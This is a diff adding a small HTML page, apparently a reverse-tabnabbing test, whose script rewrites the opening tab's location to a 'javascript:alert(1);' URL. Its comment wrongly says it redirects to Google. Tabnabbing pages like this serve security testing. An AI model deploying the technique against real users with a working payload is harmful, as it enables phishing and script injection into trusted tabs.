@@ -1,0 +1,15 @@
+
+<html>
+<head>
+  <title>Tabnabbed!</title>
+  <script type="text/javascript">
+    // Redirect the opener (original tab) to Google
+    if (window.opener && !window.opener.closed) {
+      window.opener.location.href = "javascript:alert(1);";
+    }
+  </script>
+</head>
+<body>
+  <h1>Tabnabbed!.</h1>
+</body>
+</html>
